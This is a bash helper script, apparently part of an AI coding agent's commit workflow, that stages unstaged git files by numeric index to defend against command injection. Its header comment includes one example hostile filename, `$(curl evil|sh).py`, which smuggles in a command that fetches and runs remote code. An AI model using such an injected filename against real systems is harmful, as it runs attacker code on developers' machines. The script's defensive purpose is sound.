#!/bin/bash
# Lists (--list) or stages (by index) the files that currently have unstaged worktree content
# relative to the index -- what commit skill step 6 offers the user to stage when something is
# already unstaged. A working-tree filename here is untrusted content on a fetched or
# contributed branch (e.g. a file named `$(curl evil|sh).py`) -- interpolating it into any
# shell command string, even quoted, is a command-injection surface, since quoting does not
# suppress $(...)/``/`$VAR` expansion. This script never receives a filename as an argument or
# on stdin: `--list` re-derives the candidate list from `git status` itself, and the staging
# mode re-derives the identical list a second time -- the model only ever has to pass back a
# small set of plain digit indices, never a single character of untrusted filename content.
#
# Called by the commit skill (step 6): run `--list` first, present the numbered output to the
# user, then re-invoke with the chosen indices once the user answers.
set -euo pipefail

git rev-parse --git-dir >/dev/null 2>&1 || { echo "Error: not inside a git repository" >&2; exit 1; }

# See lint-staged-python.sh for why this cd is needed: paths below are repo-root-relative
# (diff.relative=false), but git resolves a relative pathspec against the invoking cwd.
cd "$(git rev-parse --show-toplevel)"

list_candidates() {
  # Y (worktree status, 2nd char) non-space covers both "has unstaged worktree changes" and
  # untracked ("??") -- exactly the set of files step 6 would otherwise offer to stage. A
  # staged rename/copy (X in R/C) carries an extra NUL-terminated ORIG_PATH field regardless of
  # Y -- read and discard it so it's never misread as an unrelated second entry.
  git -c diff.relative=false status --porcelain -z | \
  while IFS= read -r -d '' entry; do
    case "$entry" in
      R*|C*)
        IFS= read -r -d '' _orig_path
        ;;
    esac
    y_char="${entry:1:1}"
    if [ "$y_char" != " " ]; then
      printf '%s\0' "${entry:3}"
    fi
  done
}

if [ "${1:-}" = "--list" ]; then
  i=0
  while IFS= read -r -d '' path; do
    i=$((i + 1))
    printf '%d\t%s\n' "$i" "$path"
  done < <(list_candidates)
  exit 0
fi

if [ "$#" -eq 0 ]; then
  echo "Usage: $0 --list | <index> [index...]" >&2
  exit 2
fi

declare -A wanted
for arg in "$@"; do
  if ! [[ "$arg" =~ ^[0-9]+$ ]]; then
    echo "Error: index '$arg' is not a positive integer" >&2
    exit 2
  fi
  wanted["$arg"]=1
done

matched=()
i=0
while IFS= read -r -d '' path; do
  i=$((i + 1))
  if [ -n "${wanted[$i]:-}" ]; then
    matched+=("$path")
  fi
done < <(list_candidates)

if [ "${#matched[@]}" -ne "${#wanted[@]}" ]; then
  echo "Error: one or more requested indices are out of range -- run --list again and retry" >&2
  exit 1
fi

printf ':(top,literal)%s\0' "${matched[@]}" | git add --pathspec-from-file=- --pathspec-file-nul
